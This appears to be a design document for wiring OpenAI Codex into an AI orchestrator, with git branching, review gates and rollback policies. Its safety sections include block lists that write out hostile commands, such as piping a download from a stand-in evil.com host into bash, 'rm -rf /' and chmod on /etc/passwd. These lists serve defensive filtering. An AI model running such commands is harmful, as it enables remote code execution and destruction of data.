# Codex Integration for Ford Perfect AI Orchestrator

**Version:** 1.0  
**Status:** Design + Prototype  
**Last Updated:** 2026-02-19

---

## Executive Summary

This document defines the architecture and implementation plan for integrating OpenAI's Codex (CLI and web-based) into the Ford Perfect AI Orchestrator while maintaining safety protocols, cost discipline, and "Augenhöhe" (partnership at eye level) principles.

**Key Constraints:**
- **No OpenAI API costs** — Web-based Codex is primary; CLI only with explicit approval
- **Git-tracked everything** — All code changes must be version-controlled
- **Safety first** — Destructive actions require explicit human approval
- **Pattern consistency** — Follow existing `qwen-code` / `qwen-task` structures

---

## 1. Architecture Design

### 1.1 Codex CLI vs. Web-Based Codex Comparison

| Aspect | Codex CLI (API) | Web-Based Codex (Browser) |
|--------|-----------------|---------------------------|
| **Cost** | ~$0.02-0.10/request (o3/o4-mini) | €0 (existing session) |
| **Speed** | Fast (~2-5s latency) | Slower (~10-30s, browser overhead) |
| **Capabilities** | Full agent mode, file editing, shell exec | Same capabilities via UI automation |
| **Limitations** | Requires API credits, rate limits | Requires active session, browser stability |
| **Sandboxing** | Built-in sandbox policies | Browser-level isolation only |
| **Context Window** | Up to 200K tokens | Limited by UI (practical ~50K) |
| **Integration** | Direct CLI calls | Selenium/Playwright automation |
| **Reliability** | High (API-based) | Medium (DOM changes, session expiry) |
| **Audit Trail** | JSON logs, structured output | Requires screenshot + text capture |

### 1.2 Recommendation: Hybrid Approach

```
PRIMARY:   Web-Based Codex (cost-free, authenticated session)
FALLBACK:  Qwen-Coder-Plus (already integrated, no OpenAI cost)
ESCALATION: Codex CLI (only with explicit human approval for complex tasks)
```

**Decision Matrix:**

```
Task Complexity →
    Low         Medium      High        Critical
    ├───┬───────────┬───────────┬──────────┤
    │   │           │           │          │
Cost│ Q │   Web     │   Web     │  Web +   │
    │ w │   Codex   │   Codex   │  Review  │
    │ e │           │           │          │
    ├───┼───────────┼───────────┼──────────┤
    │   │           │           │          │
Speed│ Q │   Web     │   Codex   │  Codex   │
    │ w │   Codex   │   CLI*    │  CLI*    │
    │ e │           │           │          │
    └───┴───────────┴───────────┴──────────┘
    * = requires explicit approval
```

### 1.3 Integration Points

```
┌─────────────────────────────────────────────────────────────┐
│                    Ford Perfect Orchestrator                │
├─────────────────────────────────────────────────────────────┤
│                                                             │
│  ┌─────────────┐    ┌─────────────┐    ┌─────────────┐     │
│  │   brain.py  │    │   router/   │    │  adapters/  │     │
│  │  (Qwen)     │    │  (decides)  │    │  (web/API)  │     │
│  └──────┬──────┘    └──────┬──────┘    └──────┬──────┘     │
│         │                  │                  │             │
│         │                  │                  │             │
│         ▼                  ▼                  ▼             │
│  ┌─────────────────────────────────────────────────────┐   │
│  │              codex-task Wrapper Script               │   │
│  │  - Git integration (branch, commit, push)            │   │
│  │  - Safety hooks (review gates, cost limits)          │   │
│  │  - Logging & audit trail                             │   │
│  └─────────────────────────────────────────────────────┘   │
│         │                  │                               │
│         ▼                  ▼                               │
│  ┌─────────────┐    ┌─────────────┐                       │
│  │  Codex CLI  │    │   OpenAI    │                       │
│  │  (opt-in)   │    │   Web       │                       │
│  │             │    │  (Selenium) │                       │
│  └─────────────┘    └─────────────┘                       │
│                                                             │
└─────────────────────────────────────────────────────────────┘
```

**Integration Layers:**

1. **Wrapper Layer** (`/opt/ai-orchestrator/bin/codex-task`)
   - Bash script following `qwen-task` pattern
   - Handles git workflow, logging, safety checks

2. **Adapter Layer** (`/opt/ai-orchestrator/lib/adapters/codex_web.py`)
   - Extends existing `OpenAIAdapter` class
   - Adds Codex-specific selectors and workflows

3. **Router Layer** (`/opt/ai-orchestrator/lib/router/codex_router.py`)
   - Decides when to use Codex vs. Qwen vs. Claude
   - Cost-benefit analysis per task type

4. **Brain Integration** (`brain.ask()` extension)
   - Optional: Add `ask_codex()` method for direct calls

---

## 2. Safety & Oversight Model

### 2.1 Preventing Runaway Code Generation

**Three-Layer Safety Net:**

```
┌────────────────────────────────────────────────────────────┐
│  Layer 1: Pre-Execution Gates                            │
│  ├── Task scope validation (file count, complexity)      │
│  ├── Cost estimate check (web: free, CLI: must approve)  │
│  └── Git branch creation (isolated workspace)            │
├────────────────────────────────────────────────────────────┤
│  Layer 2: Execution Monitoring                           │
│  ├── Command whitelist (no rm -rf, no curl | bash)       │
│  ├── Output size limits (max 10K lines)                  │
│  └── Timeout enforcement (max 5 min per command)         │
├────────────────────────────────────────────────────────────┤
│  Layer 3: Post-Execution Review                          │
│  ├── Diff preview before commit                          │
│  ├── Human approval for destructive changes              │
│  └── Auto-rollback on test failures                      │
└────────────────────────────────────────────────────────────┘
```

**Implementation:**

```bash
# Safety config in /opt/ai-orchestrator/etc/codex-config.yaml
safety:
  max_files_changed: 10
  max_lines_changed: 500
  forbidden_patterns:
    - "rm -rf /"
    - "curl .* | bash"
    - "wget .* | sh"
    - "chmod 777"
    - "sudo"
  require_review_if:
    - files_changed > 5
    - lines_deleted > 100
    - touches_production_config: true
```

### 2.2 Git Workflow: Feature Branches & Reviews

**Branch Naming Convention:**
```
feature/{task-type}/{short-description}-{timestamp}
  ├── feature/refactor/auth-module-20260219-143022
  ├── feature/add-tests/user-service-20260219-143022
  ├── feature/fix-issue-42-20260219-143022
  └── feature/new-feature-y-20260219-143022
```

**Commit Message Convention (Conventional Commits):**
```
<type>(<scope>): <description>

[optional body]

[optional footer]

Types:
  feat:     New feature
  fix:      Bug fix
  refactor: Code restructuring (no behavior change)
  test:     Adding or updating tests
  docs:     Documentation changes
  chore:    Maintenance tasks
```

**Auto-Commit Policies:**

| Condition | Action |
|-----------|--------|
| ≤3 files changed, ≤50 lines | Auto-commit, auto-push |
| 4-10 files OR 51-200 lines | Auto-commit, manual push |
| >10 files OR >200 lines | Manual review required |
| Any deletion >50 lines | Manual review required |
| Touches config files | Manual review required |

### 2.3 Rollback Strategies

**Automatic Rollback Triggers:**
1. Test suite fails after changes
2. Syntax errors detected in generated code
3. Linter violations (critical only)
4. Import errors or missing dependencies

**Rollback Process:**
```bash
#!/usr/bin/env bash
# Auto-rollback script
git stash push -m "auto-stash-before-codex"
git checkout HEAD -- .
# Notify user: "Changes rolled back. Stash saved as: auto-stash-before-codex"
```

**Recovery Options:**
```bash
codex-task --undo           # Revert last codex-task changes
codex-task --restore-stash  # Restore stashed changes
codex-task --blame          # Show what codex changed
```

---

## 3. Use-Case Mapping

### 3.1 When to Use Which Tool

| Task Type | Recommended Tool | Rationale |
|-----------|------------------|-----------|
| **Quick refactoring** (<5 files) | Qwen-Coder-Plus | Fast, free, already integrated |
| **Write tests** | Web Codex | Good at boilerplate, no API cost |
| **Debug complex error** | Qwen-Coder-Plus → Web Codex | Start with Qwen, escalate if needed |
| **Add new feature** | Web Codex (with git workflow) | Full agent capabilities, cost-free |
| **Large-scale refactor** (>10 files) | Web Codex + Human Review | Needs oversight regardless of tool |
| **Time-critical fix** | Qwen-Coder-Plus | Speed over perfection |
| **Creative/exploratory** | Web Codex | Better reasoning, no cost pressure |
| **Production deployment code** | Web Codex + Mandatory Review | Safety first |

### 3.2 Cost-Benefit Analysis

```
Task: "Refactor authentication module"
─────────────────────────────────────────────────────────────
Tool            │ Time   │ Cost    │ Quality │ Verdict
─────────────────────────────────────────────────────────────
Qwen-Coder      │ 2 min  │ €0.001  │ Good    │ ✅ Best for simple refactors
Web Codex       │ 5 min  │ €0      │ Better  │ ✅ Best for complex logic
Codex CLI (o3)  │ 1 min  │ €0.15   │ Best    │ ❌ Overkill, costs money
─────────────────────────────────────────────────────────────

Task: "Write 20 unit tests"
─────────────────────────────────────────────────────────────
Tool            │ Time   │ Cost    │ Quality │ Verdict
─────────────────────────────────────────────────────────────
Qwen-Coder      │ 3 min  │ €0.002  │ OK      │ ⚠️ May miss edge cases
Web Codex       │ 8 min  │ €0      │ Great   │ ✅ Best value
Codex CLI (o3)  │ 2 min  │ €0.25   │ Great   │ ❌ Not worth the cost
─────────────────────────────────────────────────────────────

Task: "Debug race condition in async code"
─────────────────────────────────────────────────────────────
Tool            │ Time   │ Cost    │ Quality │ Verdict
─────────────────────────────────────────────────────────────
Qwen-Coder      │ 5 min  │ €0.003  │ Maybe   │ ⚠️ Try first
Web Codex       │ 10 min │ €0      │ Likely  │ ✅ Escalate here if Qwen fails
Human Expert    │ 30 min │ €50/hr  │ Certain │ Last resort
─────────────────────────────────────────────────────────────
```

### 3.3 Example Workflows

#### Workflow 1: "Refactor this module"
```bash
# 1. Create task
codex-task --type refactor "Refactor auth_module.py to use dependency injection"

# 2. Automatic workflow:
#    - Creates branch: feature/refactor/auth-module-20260219-143022
#    - Codex analyzes code
#    - Generates refactored version
#    - Runs linter
#    - Shows diff for review

# 3. User reviews diff
#    If approved:
codex-task --commit -m "refactor(auth): implement dependency injection"

# 4. Auto-push (if within policy limits)
#    Or manual push if large changes
```

#### Workflow 2: "Write tests for X"
```bash
codex-task --type test "Write comprehensive unit tests for user_service.py"

# Codex will:
# 1. Read user_service.py
# 2. Identify testable functions
# 3. Generate test_user_service.py
# 4. Run tests locally
# 5. Report results

# Output:
# ✓ 15 tests passed
# ✗ 2 tests failed (see details)
# Branch: feature/test/user-service-20260219-143022
```

#### Workflow 3: "Debug this error"
```bash
# Paste error + context
codex-task --type debug "
Error: AssertionError in test_login
Stack trace: [...]
Relevant code: $(cat auth_module.py)

Please identify root cause and suggest fix.
"

# Codex responds with:
# 1. Root cause analysis
# 2. Suggested fix (as diff)
# 3. Test to prevent regression
```

#### Workflow 4: "Add new feature Y"
```bash
codex-task --type feature "
Implement password reset functionality:
- POST /api/reset-password
- Email token generation
- Token expiry (1 hour)
- Rate limiting (5 requests/hour)

Requirements:
- Follow existing patterns in auth_module.py
- Add tests
- Update API docs
"

# This triggers:
# 1. Multi-file analysis
# 2. Implementation plan (for review)
# 3. Code generation
# 4. Test generation
# 5. Full review gate (human approval required)
```

---

## 4. Git Integration Strategy

### 4.1 Automated Branching

**Branch Creation Logic:**
```python
def create_branch(task_type, description):
    timestamp = datetime.now().strftime("%Y%m%d-%H%M%S")
    sanitized = re.sub(r'[^a-z0-9-]', '-', description.lower())[:50]
    branch_name = f"feature/{task_type}/{sanitized}-{timestamp}"
    
    # Ensure clean working tree
    run("git stash push -m 'pre-codex-stash'")
    run(f"git checkout -b {branch_name}")
    
    return branch_name
```

### 4.2 Commit Conventions

**Enforced via pre-commit hook:**
```bash
#!/usr/bin/env bash
# .git/hooks/commit-msg
commit_msg=$(cat "$1")
pattern="^(feat|fix|refactor|test|docs|chore)(\([a-z-]+\))?: .+"

if ! echo "$commit_msg" | grep -qE "$pattern"; then
    echo "ERROR: Commit message must follow conventional commits format"
    echo "Example: feat(auth): add password reset endpoint"
    exit 1
fi
```

### 4.3 Auto-Push Policies

```yaml
# /opt/ai-orchestrator/etc/git-policy.yaml
auto_push:
  enabled: true
  conditions:
    max_files: 3
    max_lines_added: 100
    max_lines_deleted: 20
    excluded_patterns:
      - "**/config/**"
      - "**/*.env*"
      - "requirements*.txt"
  
  require_approval_if:
    - any_deletions > 50
    - touches_production: true
    - security_sensitive: true
```

### 4.4 GitHub Integration

**Existing Repo:** `Mutual-Roots/ford-perfect`

**PR Workflow (Optional Enhancement):**
```bash
codex-task --create-pr "feat: add codex integration"

# Creates:
# 1. Push to feature branch
# 2. Open PR on GitHub
# 3. Add labels: ai-generated, needs-review
# 4. Assign reviewer (configurable)
# 5. Post notification to Telegram
```

---

## 5. Implementation Plan

### Phase 1: Basic Wrapper Script (Week 1)
**Goal:** Minimal viable `codex-task` command

**Deliverables:**
- [ ] `/opt/ai-orchestrator/bin/codex-task` (bash wrapper)
- [ ] Basic argument parsing (--type, --output, --verbose)
- [ ] Integration with existing OpenAI web adapter
- [ ] Simple logging to `/opt/ai-orchestrator/var/logs/codex-tasks.log`

**Scope:** No git integration yet, manual workflow only

### Phase 2: Git Integration (Week 2)
**Goal:** Automated branching and committing

**Deliverables:**
- [ ] Auto-branch creation
- [ ] Conventional commit enforcement
- [ ] Diff preview before commit
- [ ] Basic auto-push policy
- [ ] `.gitignore` updates for codex artifacts

### Phase 3: Safety Hooks (Week 3)
**Goal:** Production-ready safety net

**Deliverables:**
- [ ] Pre-execution validation (file count, complexity)
- [ ] Forbidden command detection
- [ ] Review gates for large changes
- [ ] Auto-rollback on test failures
- [ ] Cost monitoring (even for web, track usage metrics)

### Phase 4: Full Orchestrator Integration (Week 4)
**Goal:** Seamless router-based tool selection

**Deliverables:**
- [ ] Router extension (`codex_router.py`)
- [ ] Cost-benefit decision logic
- [ ] Fallback chains (Qwen → Web Codex → CLI Codex)
- [ ] Unified logging across all tools
- [ ] Documentation complete

---

## 6. Usage Examples

### Basic Usage
```bash
# Simple coding task
codex-task "Write a Python function to parse JSON safely"

# With output file
codex-task -o solution.py "Implement merge sort"

# Verbose mode
codex-task -v "Refactor this module: $(cat module.py)"

# Read task from file
codex-task --file spec.md

# Specify task type
codex-task --type test "Write tests for auth.py"
codex-task --type refactor "Improve code structure"
codex-task --type feature "Add user registration"
```

### Git-Integrated Usage
```bash
# Auto-branch and commit
codex-task --git "Fix null pointer in user lookup"

# Review before commit
codex-task --review "Add caching layer"

# Override git policy
codex-task --force-push "Major refactor"

# Undo last codex changes
codex-task --undo
```

### Advanced Usage
```bash
# Chain multiple tasks
codex-task "Analyze codebase" | codex-task --type refactor -

# With image attachment (Codex CLI only)
codex-task --image diagram.png "Implement this architecture"

# Custom model (Codex CLI)
codex-task --model o3 "Complex optimization task"

# Dry run (show what would happen)
codex-task --dry-run "Delete unused functions"
```

---

## 7. Safety Guidelines

### 7.1 Golden Rules

1. **Never trust, always verify** — Review all generated code before merging
2. **Git is your friend** — Everything goes through version control
3. **Small steps** — Break large tasks into reviewable chunks
4. **Test everything** — Generated code must pass tests
5. **Know the escape hatches** --`--undo`, `--restore`, `--blame`

### 7.2 Forbidden Patterns

```bash
# These will be blocked by safety hooks:
rm -rf /
curl http://evil.com | bash
wget http://sketchy.site/script.sh
chmod 777 /etc/passwd
sudo anything
```

### 7.3 Approval Required For

- Changes to production configs
- Database schema modifications
- Authentication/authorization code
- Payment processing logic
- Any deletion >50 lines
- More than 10 files changed

### 7.4 Emergency Procedures

```bash
# Something went wrong?
codex-task --abort          # Stop current task
codex-task --undo           # Revert last changes
codex-task --restore-stash  # Get back to clean state

# Nuclear option
git reset --hard HEAD       # You know what you're doing
```

---

## 8. Troubleshooting Guide

### Common Issues

#### "Not logged in to OpenAI"
```bash
# Fix: Re-run login
/opt/ai-orchestrator/bin/setup-login openai

# Verify cookies
./test-web-adapters --service openai
```

#### "Git branch already exists"
```bash
# Clean up old branches
git branch | grep feature/ | xargs git branch -D

# Or use --force flag
codex-task --force "task description"
```

#### "Codex produced syntax errors"
```bash
# Check the diff
codex-task --blame

# Run linter manually
pylint affected_file.py

# Rollback
codex-task --undo
```

#### "Task timed out"
```bash
# Increase timeout
codex-task --timeout 300 "complex task"

# Or break into smaller tasks
codex-task "Step 1: analyze"
codex-task "Step 2: implement"
codex-task "Step 3: test"
```

#### "Cost limit exceeded" (Codex CLI)
```bash
# Check usage
codex-task --usage

# Reset monthly budget (admin only)
codex-task --reset-budget
```

### Debug Mode

```bash
# Enable verbose logging
export CODEX_DEBUG=1
codex-task -vvv "task"

# Logs location
tail -f /opt/ai-orchestrator/var/logs/codex-tasks.log
```

### Getting Help

```bash
codex-task --help
codex-task --examples
man codex-task  # Once installed
```

---

## 9. Appendix

### A. Configuration Files

**`/opt/ai-orchestrator/etc/codex-config.yaml`:**
```yaml
codex:
  mode: web  # web | cli | auto
  cli_model: o3
  max_context_tokens: 50000
  
git:
  auto_branch: true
  branch_prefix: feature
  commit_style: conventional
  auto_push_threshold:
    files: 3
    lines: 100
    
safety:
  max_files_changed: 10
  max_lines_changed: 500
  require_review:
    deletions_gt: 50
    touches_config: true
    security_sensitive: true
    
logging:
  level: info
  file: /opt/ai-orchestrator/var/logs/codex-tasks.log
  format: json
```

### B. File Structure

```
/opt/ai-orchestrator/
├── bin/
│   ├── codex-task          # Main wrapper script
│   ├── codex-review        # Manual review helper
│   └── codex-undo          # Rollback helper
├── lib/
│   ├── adapters/
│   │   └── codex_web.py    # Web automation
│   └── router/
│       └── codex_router.py # Tool selection logic
├── etc/
│   └── codex-config.yaml   # Configuration
├── var/
│   └── logs/
│       └── codex-tasks.log # Task history
└── docs/
    └── codex-integration.md # This document
```

### C. Changelog

- **2026-02-19:** Initial design and prototype implementation

---

**Document Owner:** Ford Perfect AI Orchestrator Team  
**Review Cycle:** Monthly  
**Next Review:** 2026-03-19
